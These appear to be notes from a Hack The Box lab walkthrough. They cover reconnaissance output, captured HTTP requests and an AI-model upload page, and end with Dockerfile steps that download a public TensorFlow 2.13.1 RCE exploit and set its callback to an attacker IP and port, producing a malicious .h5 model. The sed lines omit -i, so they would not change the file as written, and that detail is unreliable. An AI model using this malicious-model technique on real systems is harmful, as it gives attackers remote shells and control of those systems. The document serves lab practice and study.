nmap output:
```
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

gobuster output:
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/logout               (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
```

nikto output:
```
+ HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```

whatweb output:
```
Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
```

register request:
```
POST /register HTTP/1.1
Host: artificial.htb
Content-Length: 67
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=random4321&email=random4321%40mail.net&password=random4321
```

login request:
```
POST /login HTTP/1.1
Host: artificial.htb
Content-Length: 47
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=random4321%40mail.net&password=random4321
```

dashboard request:
```
GET /dashboard HTTP/1.1
Host: artificial.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyLs3mb8ucwx9O6sCQaq7uY4
Connection: keep-alive
```

decoded jwt header:
```
{
  "user_id": 7,
  "username": "random4321"
}
```

dashboard upload page html:
```
<main>
    <section class="dashboard-section">
        <h2>Your Models</h2>
        <p style="color: black;">Upload, manage, and run your AI models here.</p>
        
        <!-- Warning message for TensorFlow version -->
        <p class="version-warning">Please ensure these <a href="/static/requirements.txt">requirements</a> are installed when building your model, or use our <a href="/static/Dockerfile">Dockerfile</a> to build the needed environment with ease.  </p>

        <!-- Upload form -->
        <form id="upload-form" enctype="multipart/form-data" action="/upload_model" method="POST">
            <input type="file" name="model_file" accept=".h5" class="file-input" required="">
            <button type="submit" class="btn" style="color: white;">Upload Model</button>
        </form>

        <!-- List models -->
        <ul class="model-list">
            
        </ul>
    </section>
</main>
```

static/requirements.txt content:
```
tensorflow-cpu==2.13.1
```

static/Dockerfile content:
```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

example python code to generate h5 model (found on home page):
```
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

tensorflow 2.13.1 rce: `https://github.com/Splinter0/tensorflow-rce`

we add this to the Dockerfile build phase:
```
# Download exploit to generate malicious model
RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py

# Replace IP
RUN sed 's/127.0.0.1/10.10.14.9/g' exploit.py

# Replace port
RUN sed 's/6666/4444/g' exploit.py

# Generate malicious h5 model payload
RUN python exploit.py
```
